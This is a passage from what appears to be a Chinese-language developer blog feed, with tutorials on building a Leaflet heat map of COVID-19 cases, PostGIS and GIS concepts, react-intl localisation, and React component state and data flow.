        <content type="html"><![CDATA[<p>這篇教學將以 leaflet 實作熱區地圖，顯示這次武漢肺炎的確診數，發佈在免費的 GitHub Page，<a href="https://github.com/LinYenCheng/virus-and-where-to-find-them/tree/feat/parcel">程式碼也開源放在 Github 上</a>，並會帶大家開箱如何把地理資訊視覺化。</p><ul><li>地理資訊系統架構</li><li>地圖函式庫 (Openlayer)</li><li>地理資訊系統名詞</li><li>地理投影方式</li><li>GeoJSON</li><li>前端常見的圖表工具</li></ul><h2 id="目標"><a href="#目標" class="headerlink" title="目標"></a>目標</h2><p>本次技術選型如下：</p><ul><li><p>leaflet.js: 比起 OpenLayers 簡單非常多，可以操作開源的 OSM，是一套操作圖層的函式庫，協助我們進行圖層的疊加，這次的地圖圖層依序為</p><ul><li>底圖: 使用免費的 OSM 圖層</li><li>熱區圖層: 透過 leaflet-heat 將點位轉換成熱區圖層</li><li>標記層: 病毒點位組成的 Maker Group</li></ul></li><li><p>leaflet-heat: 建立可以疊在 leaflet 上的熱區圖層</p></li><li><p>axios: 抓取遠端資料，整合資料來源，因為是其他 Domain 的資料，所以我們可以</p><ul><li><code>https://cors-anywhere.herokuapp.com/https://我們想要拿資料的位置</code></li><li>資料不太穩定時則是透過 github actions 定時的把結果 (JSON) 一起 Build 進去原始檔中</li></ul></li><li><p>c3.js: 顯示圖表</p></li><li><p>parcel: 打包工具</p></li></ul><p>只需要<a href="https://github.com/LinYenCheng/virus-and-where-to-find-them/blob/master/index.js">寫少少行的程式碼</a>就完成了這個地圖的應用。</p><p><a href="https://linyencheng.github.io/virus-and-where-to-find-them/">https://linyencheng.github.io/virus-and-where-to-find-them/</a></p><p>同樣的概念，透過開源的資料整合前端的全文檢索，之前也做出了<a href="https://github.com/LinYenCheng/coffee-map">全台咖啡廳的地圖</a>，整理咖啡廳的用餐時間、插座、WiFi、安靜程度等資訊在地圖中，方便搜尋及瀏覽。</p><p><a href="https://linyencheng.github.io/coffee-map/">https://linyencheng.github.io/coffee-map/</a></p><p>有發現到以下問題</p><ul><li>網路上公開的 API 常常不是很穩定或是回應速度過慢</li><li>CSV 檔從接收到回應，需要轉成 JSON 到畫面顯示這個過程費時</li></ul><p>有想到以下方案:</p><ul><li>先製作好基本的 JSON，有抓到正確的資料後續再更新資料</li><li>直接產生好固定的 JSON 檔，並想辦法透過 CI&#x2F;CD 工具定期更新</li></ul><p>最後評估專案是在 Github，所以決定直接產生好固定的 JSON 檔，並透過 Github 內建的 <a href="/2020/06/08/tool-github-action/">Github Action 自動定期更新專案</a>。</p><h3 id="發佈"><a href="#發佈" class="headerlink" title="發佈"></a>發佈</h3><p>GitHub Page 預設支援將 <a href="https://help.github.com/en/github/working-with-github-pages/configuring-a-publishing-source-for-your-github-pages-site">docs</a> 中的網頁顯示出來，所以我們需要在專案中建立 docs 資料夾，並且放置打包後的檔案們，發布後在 GitHub Repo 中設定開啟即可。</p><h3 id="parcel"><a href="#parcel" class="headerlink" title="parcel"></a>parcel</h3><p>不需要任何配置，直接使用 parcel 打包工具，我們可以:</p><ul><li>使用 Hot Reload 開發</li><li>將網頁程式打包及最佳化</li></ul><p>只需要加上 <code>npm script</code> 如下：</p><ul><li><code>start: parcel --out-dir dev index.html</code> ，執行 <code>npm start</code> 後，會建立開發時 build 過的檔案，預設會在 dist 或是我們可以指定資料夾，開發 server 會啟動在 localhost:1234</li><li><code>build: parcel build index.html --out-dir docs --public-url ./</code>，執行 <code>npm build</code> 後，會產生最佳化的檔案</li></ul><h2 id="地理資訊系統架構"><a href="#地理資訊系統架構" class="headerlink" title="地理資訊系統架構"></a>地理資訊系統架構</h2><p><img src="/2018/01/25/js-web-gis-infografic/DataFlow.png" alt="DataFlow"></p><ul><li>PostGIS&#x2F;PostgreSQL: 資料庫</li><li>GeoServer: 提供 Web Severvice</li><li>GeoWebCache: 圖磚快取</li><li>OpenLayers.js、Leaflet.js: 前端網頁操作</li></ul><p>雖然資源很多，整合最好的還是 PostGIS&#x2F;PostgreSQL 套裝，但第一次看到這隻呆肥的大象，除了知道大象鼻子可以頂球，其他好像蠻沒方向的。</p><p><a href="http://postgis.net/windows_downloads/">http://postgis.net/windows_downloads/</a></p><p><img src="/2018/01/25/js-web-gis-infografic/StackBuild.jpg" alt="StackBuild"></p><p>其實裝完 PostgreSQL 之後就有內建安裝 PostGIS 套件的工具，因為 PostgreSQL 其實只是一般的資料庫而已，需要加上能收發地理資訊的外掛也就是 PostGIS，裝完之後，絕對會發現不能馬上用，查了一下官方的文件後會發現以下說明，就是說你都要自己 DIY 加的意思，相關就列在下面，蠻多功能還沒去試的，<code>SELECT postgis_full_version();</code> 可以看到底裝了什麼，最後再裝 GeoServer 然後簡單設定一下跟我們剛剛裝的資料庫結合，基本上後端就搞定了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Please note the PostGIS windows installer, no longer creates a template database. Using CREATE EXTENSION postgis; for enabling PostGIS in a database is the recommended way.</span><br><span class="line">CREATE EXTENSION postgis; -- Enable Topology</span><br><span class="line">CREATE EXTENSION postgis_topology; -- Enable PostGIS Advanced 3D -- and other geoprocessing algorithms</span><br><span class="line">CREATE EXTENSION postgis_sfcgal; -- fuzzy matching needed for Tiger</span><br><span class="line">-- if you installed with pcre</span><br><span class="line">-- you should have address standardizer extension as well</span><br><span class="line">CREATE EXTENSION address_standardizer; -- example rule data set</span><br><span class="line">-- if you want to install tiger geocoder --</span><br><span class="line">CREATE EXTENSION fuzzystrmatch; -- rule based standardizer</span><br><span class="line">CREATE EXTENSION postgis_tiger_geocoder; -- routing functionality</span><br><span class="line">CREATE EXTENSION address_standardizer_data_us; -- Enable US Tiger Geocoder</span><br><span class="line">CREATE EXTENSION pgrouting; -- spatial foreign data wrappers</span><br><span class="line">CREATE EXTENSION ogr_fdw; -- LIDAR support</span><br><span class="line">CREATE EXTENSION pointcloud; -- LIDAR Point cloud patches to geometry type cases</span><br><span class="line">CREATE EXTENSION pointcloud_postgis;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先資料庫是需要能夠存地理資訊的來源，再來就是也可以提供其他形式的地理資訊來源，Geoserver 最重要的工作其實也就是這樣，把地理資訊吃進來，處理後吐出各種地理資訊，前端其實只是單純的配合配置，然後有點小技巧操弄一下，一個簡單的地圖就完成了。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/v1jszbmxWZ4" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="地理資訊系統名詞"><a href="#地理資訊系統名詞" class="headerlink" title="地理資訊系統名詞"></a>地理資訊系統名詞</h2><ul><li>GML (Geography Markup Language): XML 地理圖形標記語言，包括空間特徵和屬性。</li><li>KML (Keyhole Markup Language): 圖形幾何特徵規格，Google Earth 使用之 KML 格式，被 OGC 採納為實作標準之一。</li><li>WCS (Web Coverage Service Specification): 網路網格資料服務規格，HTTP 介面，取得特定的網格式影像資料。</li><li>WMS (Web Map Service Specification): 網路地圖服務規格，HTTP 介面，取得地圖影像，如 JPG、GIF 與 PNG。</li><li>WFS (Web Feature Service Specification): 網路圖徵服務規格，HTTP 介面，取得向量式的地理圖徵資料，可進行資料編修目前採用的資料格式為 GML。</li><li>WPS (Web Processing Service Specification): 網路處理服務規格，透過該標準使用者可以將地理資料處理工作交付給伺服器端來處理。</li></ul><h2 id="地理投影方式"><a href="#地理投影方式" class="headerlink" title="地理投影方式"></a>地理投影方式</h2><p>因為地球是圓的，但不是很圓，當圓的東西畫在平面上就需要投影，台灣地圖常見的坐標分別是 TWD67、TWD97 和 WGS84，其中 WGS84 就是常見的 GPS (lat, lon) 系統， 以下為台灣本島常用的 EPSG (European Petroleum Survey Group) 代碼:</p><ul><li>EPSG 3857(900913): 使用於各種網路地圖上，由 Mercator 投影而來適合用於平面地圖，如 Google map,OSM,等等皆預設採用</li><li>EPSG 4326(WGS 84): 經緯度系統，經常出現在氣候的定位適合用於球形地圖</li><li>EPSG:3826(TWD97): TM2 (二度分帶，中央經線 121 度)(適用臺灣本島，目前政府使用)</li><li>EPSG:3828(TWD67): TM2 (二度分帶，中央經線 121 度)(適用臺灣本島，早期政府使用)</li></ul><p>註一：N 度分帶，把球面切成 N 片最後拼起來，變形程度 N 越大則越小<br>註二: 代碼就是個小團體訂了小團體規則，最後變成大團體的各種規則</p><h2 id="GeoJSON"><a href="#GeoJSON" class="headerlink" title="GeoJSON"></a>GeoJSON</h2><p>GeoJSON 也是常用的資料格式，首先推薦一個網站 geojson.io ，看名字就知道是做 geojson 的 IO (被打 XD) ，那啥是 GeoJSON 呢？Geo 是形容詞？JSON 是 JavaScript Object Notation，是一種常用的傳輸資料格式，就算是加上 Geo 他其實還是 JSON 不過就是裡頭會有固定的格式罷了 XDDD</p><p>GeoJSON 在我看來最主要的用途在於 Infographic 也就是資訊視覺化(硬要烙英文 XDDD)，因為轉成 JSON 檔後在前端操弄上真的還蠻有幫助的，可以很方便地去做基本的邏輯判斷及顯示，封面圖那段 code 主要是透過 PostGIS 去取得 DB 中的資料並轉成 GeoJSON ，簡單來說就是透過 PostGIS 內建的函式 ST_AsGeoJSON 幫忙，來組成我們想要的 JSON 檔，然後 SQL 寫得稍微複雜一點點而已 XD</p><p><a href="http://geojson.io/#map=2/20.0/0.0">http://geojson.io/#map=2/20.0/0.0</a></p><h2 id="前端常見的圖表工具"><a href="#前端常見的圖表工具" class="headerlink" title="前端常見的圖表工具"></a>前端常見的圖表工具</h2><p>目前常見的有以下三種:</p><ul><li>Chart.js</li><li>D3.js</li><li>C3.js</li></ul><p>當然是從最熱門的 D3 開始看 XDDD 初步的感覺是，D3 適合較進階的使用者使用，網路上一句解釋說的不錯 :</p><blockquote><p>D3.js 的基礎不是在視覺化，而是資料與物件的結合</p></blockquote><p>D3 將資料對應到 dom 上，再透過方便的介面來詳細的定義各式需要的效果，文件要閱讀會需要一定的基礎知識，隨意舉一個 Voronoi Diagram，另外還有像是 topojson 這個蠻常在範例中看到個格式，可能都是很多人沒聽過的名詞 Orz</p><p>相對於困難的 D3，C3 和 Chart.js 就相對親民許多，C3 較 D3 容易這是當然的，畢竟 C3 就是以 D3 為基礎並簡化寫法的 Library，C3 和 Chart.js 兩者都是出圖表的函式庫，像是常見的 Line chart, Bar chart, Pie chart 等，Chart 在 Github 星星頗多，搭配基本客製化的配置檔其實基礎操作也夠用了，兩者使用起來的方法也差異不大~</p><p>資訊視覺化相關的呈現，除了統計圖表外，還有地理資訊在地圖上的顯示方式，地圖視覺化方式大概是熱點圖、群聚圖、航線、圖層上色後疊合，其中有看到幾個比較有趣的應用：<a href="https://moeaegis.cartodb.com/viz/9e6ca95c-7326-11e5-9150-0e3a376473ab/embed_map">竊盜</a>、<a href="http://er.mohw.g0v.tw/#/dashboard/file/all.json">重度急診即時訊息</a>、<a href="http://env.g0v.tw/air/">環境儀錶板(pm 2.5)</a>、一定要推一下的<del>制服(X)</del><a href="http://uniform.wingzero.tw/">正妹(O)地圖</a>、或是簡單的<a href="http://www.datapointed.net/visualizations/maps/distance-to-nearest-mcdonalds-sept-2010/">麥當當距離圖</a>~</p>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 多國語言簡介(使用 react-intl)</title>
      <link href="/2017/09/21/react-intl/"/>
      <url>/2017/09/21/react-intl/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-React-Intl"><a href="#什麼是-React-Intl" class="headerlink" title="什麼是 React Intl?"></a>什麼是 React Intl?</h2><p>React Intl 這套函式庫讓 React 實做多國語系更加直觀，透過現成的元件和 API 能處理字串、日期、數字的轉換。</p><h2 id="React-Intl-主要功能"><a href="#React-Intl-主要功能" class="headerlink" title="React Intl 主要功能"></a>React Intl 主要功能</h2><p>React Intl 主要提供下列的功能:</p><ul><li>支援數字和分隔符號格式</li><li>日期與時間的格式</li><li>顯示距離現在多久</li><li>支援 150+ 種語言</li><li>在瀏覽器以及 Node 環境都可運行</li><li>依照標準建立的一套函式庫</li></ul><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><p>使用 Yahoo react-intl 來幫 React 專案做多國語系處理，最重要的就是安裝 <code>npm install --save react-intl</code>。</p><p>專案配置先加入<code>addLocaleData</code>各語系配置檔，呆丸專用繁體中文 zh-Hant-TW 已包含在 zh 中可以直接使用，然後透過 <code>IntlProvider</code> 注入相關環境及設定到我們的 App 中，其中像是現在要顯示的語系(locale)及翻譯黨(messages)，然後就可以透過更改 local 及 message 達到語言切換的目的~</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; addLocaleData &#125; <span class="keyword">from</span> <span class="string">&quot;react-intl&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> en <span class="keyword">from</span> <span class="string">&quot;react-intl/locale-data/en&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> zh <span class="keyword">from</span> <span class="string">&quot;react-intl/locale-data/zh&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> es <span class="keyword">from</span> <span class="string">&quot;react-intl/locale-data/es&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addLocaleData</span>([...en, ...zh, ...es]);</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">IntlProvider</span> <span class="attr">locale</span>=<span class="string">&#123;localeProp&#125;</span> <span class="attr">key</span>=<span class="string">&#123;localeProp&#125;</span> <span class="attr">messages</span>=<span class="string">&#123;messagesProp&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">IntlProvider</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><p>假設雙語的話，就是三位一體的概念，首先必須把專案裏需要雙語的地方改成特定元件或是變數,接著配合剛才的元件或變數中的 <code>id</code> 撰寫翻譯檔,然後透過改變剛剛提到的 locale, message 去對應切換相關語言翻譯檔~</p><p>一般顯示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FormattedMessage</span> id=<span class="string">&quot;App.hello&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p>當成變數使用，注入後使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; intl &#125; = props;</span><br><span class="line">  <span class="keyword">const</span> strHello = intl.<span class="title function_">formatMessage</span>(&#123; <span class="attr">id</span>: <span class="string">&quot;App.hello&quot;</span> &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">injectIntl</span>(<span class="title class_">App</span>);</span><br></pre></td></tr></table></figure><p>英文語言</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;App.hello&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>中文語言</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;App.hello&quot;</span><span class="punctuation">:</span> <span class="string">&quot;哈囉&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="locale"><a href="#locale" class="headerlink" title="locale"></a>locale</h3><p>透過 <code>injectIntl()</code> 這個 HOC 就可以使用程式取得現在 React Intl 設定的語系</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; injectIntl, intlShape &#125; <span class="keyword">from</span> <span class="string">&#x27;react-intl&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">const</span> <span class="title function_">LocaleComponent</span> = (<span class="params">&#123; intl &#125;</span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;`語系: $&#123;intl.locale&#125;`&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="title class_">LocaleComponent</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">  <span class="attr">intl</span>: intlShape.<span class="property">isRequired</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">injectIntl</span>(<span class="title class_">LocaleComponent</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Placeholder"><a href="#Placeholder" class="headerlink" title="Placeholder"></a>Placeholder</h3><p>這時候需要用到比元件更底層 API <code>formatMessage()</code>，在使用 <code>injectIntl()</code> 注入 <code>intl</code> 物件到元件中後，就可以透過 <code>formatMessage()</code> 來進行字串的轉換</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; injectIntl, intlShape &#125; <span class="keyword">from</span> <span class="string">&#x27;react-intl&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">LocaleComponent</span> = (<span class="params">&#123; intl &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> placeholder = intl.<span class="title function_">formatMessage</span>(&#123;<span class="attr">id</span>: <span class="string">&#x27;messageId&#x27;</span>&#125;)</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">&#123;placeholder&#125;</span> /&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">LocaleComponent</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">  <span class="attr">intl</span>: intlShape.<span class="property">isRequired</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">injectIntl</span>(<span class="title class_">LocaleComponent</span>)</span><br></pre></td></tr></table></figure><h3 id="設計-HOC"><a href="#設計-HOC" class="headerlink" title="設計 HOC"></a>設計 HOC</h3><p>完全建議在專案一開始就加入多國語言的配置，這樣才不會到後來各種麻煩，底下 Demo 了一個交換語言用的 Container，透過每次改變語言去改變狀態並傳入 <code>IntlProvide</code> 中，當然也可以考慮用 HOC 的方式去包裝~</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HotSwappingIntlProvider</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="keyword">const</span> &#123; <span class="attr">initialLocale</span>: locale, <span class="attr">initialMessages</span>: messages &#125; = props;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; locale, messages &#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleChange</span> = <span class="variable language_">this</span>.<span class="property">handleChange</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">handleChange</span>(<span class="params">locale</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> messages = enJson;</span><br><span class="line">    <span class="keyword">if</span> (locale !== <span class="string">&quot;en&quot;</span>) &#123;</span><br><span class="line">      messages = zhJson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">locale</span>: locale,</span><br><span class="line">      <span class="attr">messages</span>: messages,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">IntlProvider</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">locale</span>=<span class="string">&#123;this.state.locale&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">key</span>=<span class="string">&#123;this.state.locale&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">messages</span>=<span class="string">&#123;this.state.messages&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      &gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;this.props.children&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">IntlProvider</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Component State and Props</title>
      <link href="/2017/05/18/thinking-component-state-and-props/"/>
      <url>/2017/05/18/thinking-component-state-and-props/</url>
      
        <content type="html"><![CDATA[<p>Component based 的概念與早期伺服器渲染 (server render) 頁面的模式不同，SPA (Single Page Application) 完全由前端元件控制，所以元件狀態 (state)、性質 (props) 就需要規範，目前較主流的方式有 MVVM 以及 FLUX。</p><h2 id="元件化"><a href="#元件化" class="headerlink" title="元件化"></a>元件化</h2><p>元件概念蠻推薦這篇介紹 <a href="http://blog.techbridge.cc/2017/01/06/web-components/">web-components 相關知識的文章</a>，目前 web-components 還只是個潮潮的想法，陸續有越來越多的支持，像是對面當紅 wechat 小程序中的 module，其實就有去實做出來，而 <code>.vue</code> 檔的 component 就相當於 web-component 中定義元件的 template，元件因此成為一個封閉環境，運作不再需要依賴其他外部資源，透過特定的寫法就能夠被 import 進程式中重複使用，<code>.vue</code> 的實作方式也讓潮潮的想法有了更好的相容性。</p><p>和 React 及 Angular 比起來，vue 少了很多的假設多了很多彈性也能夠很簡單的做到雙向資料流，當然也可以參考 Redux 的想法把狀態統一管理，像是<del>偷懶的</del>把資料放在 localStorage 中，這樣就可以統一取得，可是其實還是少了順序性 Orz</p><h2 id="元件的狀態與性質"><a href="#元件的狀態與性質" class="headerlink" title="元件的狀態與性質"></a>元件的狀態與性質</h2><p>最近比較認真看 <a href="https://facebook.github.io/react/docs/react-component.html#props">React component</a> 相關的東西，發現了一些跟科學上的小關聯，來~讓我們看下去，React 元件有兩種 Instance Properties，分別是 props 和 state</p><ul><li>props 是從其他元件傳過來的不可改變</li><li>state 則是可以透過運算或條件來改變的</li></ul><p>看到這些不小心就回想起熱力學老師說過</p><blockquote><p>什麼是 Property? 性質??!!? 老師給你０分 XDDD</p></blockquote><p>Property 會是在一個系統中且可量測的某種狀態，系統簡單來看可以當作是被限制住的空間也就是 control volume，若是在 control volume 中，狀態能成為 homogeneous 的 steady state，也就是達到巨觀可量測的條件，那麼那個均質的穩定狀態我們就叫做 Property。</p><p>元件中的狀態會改變，元件程式最後一行後，狀態也就不會再變化，這時的狀態可以看成是 Property，而穩定的狀態就會顯示在使用者介面上，所以元件中運算的穩定 state 就可以當成 Property 傳遞給所包覆的小元件來使用。</p><p>而狀態與性質搭配元件的週期就會引發元件的改變，唯有透過事件觸發取改動狀態或是外設性質的改變才會驅動畫面的渲染。主要常用的也就是 componentDidMount (穩定不在變化後)、componentDidUpdate (被狀態或外設性質觸發改變) 這兩個週期。</p><p>更詳細的說明，可以到圖片來源的連結去看看。 (<a href="https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/">https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/</a>)</p><p><img src="/2017/05/18/thinking-component-state-and-props/state.png" alt="state"></p><h2 id="資料流"><a href="#資料流" class="headerlink" title="資料流"></a>資料流</h2><p>UI 為顯示資訊的媒介，當然會和資料產生關係，這時就出現下面的情形:</p><ol><li>資料的改變是否影響 UI 的呈現?</li><li>UI 的操作是否影響資料的改變?</li></ol><p>最天真的做法是直接在 Dom 中綁定資料，但這樣程式就必須每次都要去找 Dom 來改變資料，後來就出現了 Model(資料) 和 View(UI) 的概念，透過直接操作 Model 來影響 View，而 Model 和 View 之間的關係則由套件幫我們處理。</p><p>第一種 <code>Model =&gt; View</code>，就是俗稱的單向資料流(綁定) one-way data flow(binding)。常見的 React 以及 FLUX 就是這個概念，FLUX 就像是定義更明確的 MVC，在關注點分離的基礎上，讓資料流變得<del>更多限制</del>可預測。</p><p>另一種會互相影響的就是 <code>Model &lt;=&gt; View</code> ，也就是雙向資料流(綁定) two-way data flow(binding)。其中有個 MVVM 的設計模式，<code>Model &lt;=&gt; ViewModel &lt;=&gt; View</code>透過操作 ViewModel 來顯示 View 及改變 Model，像是　 Vue.js 中的 v-model，舉例來說<code>&lt;input v-model=&quot;message&quot;&gt;</code>用 MVVM 來看就是 <code>input &lt;=&gt; v-model &lt;=&gt; message</code>。</p><p>Vue.js 官方的文件簡單易懂，實際上可以試著外掛到原有的程式上試玩，很快就可以有初步的了解了!!! Vue.js 就是基於 MVVM 概念實作的框架，剛開始建議直接使用 <a href="https://github.com/vuejs/vue-cli">vue-cli</a>，<a href="https://github.com/vuejs/vue-loader">vue-loader</a> 等等基本的配置檔都配置好了，可以完全用元件的概念去寫程式，<code>vue-loader</code> 讓我們能夠可以把所需都裝在一個 <code>.vue</code> 檔裡，css 也提供了 scoped 這個強大<del>到讓人可以偷懶</del>的功能 XDDD</p><p>因為 vue 蠻熱門的關係，所以當然有<a href="https://github.com/vuejs/awesome-vue">相當多的資源</a>可以使用，也有用來實作 SPA 路由的 <a href="https://github.com/vuejs/vue-router">vue-router</a> 和狀態管理的 <a href="https://github.com/vuejs/vuex">vuex</a>，所以看得出來若是需要多的功能，都是需要自己額外加裝的 XDDD 最重要的是目前大部分主流的編輯器也都有蠻好的支援了~!!!</p><p>目前有用過 Vue 做過以下兩個 SPA</p><ol><li><a href="https://linyencheng.github.io/Note/">Vue js Note</a></li><li><a href="https://www.health.ntpc.gov.tw/medi">Medicare</a></li></ol><h2 id="有限狀態機"><a href="#有限狀態機" class="headerlink" title="有限狀態機"></a>有限狀態機</h2><p>UI 同時也會受到使用者操作影響，加上 Javascript 是本身單執行緒的關係，資料也會因非同步 (ajax, setTimeout) 改變，操作加上非同步的變化，正確處理 Model 和 View 就變得越來越困難且複雜，舉登入搶票這個動作來說，拆解成底下四個步驟</p><ol><li>按下 Login 按鍵</li><li>發出非同步請求</li><li>確認帳號資訊</li><li>搶票</li><li>進入搶票流程</li><li>完成搶票</li></ol><p>若是在第五步完成前，使用者瞬間又按下了搶票，此時使用者是否算是成功呢?</p><p><a href="http://codeincomplete.com/posts/javascript-state-machine-v2/demo/">javascript-state-machine</a>是一套實作狀態機的函式庫，透過觸發事件來做狀態的改變，而狀態改變的路徑是事先嚴格定義清楚的，像是我們透過發請求的事件來處發狀態從未登入移動到處理中</p><p>未登入 —–&gt; 處理中 —–&gt; 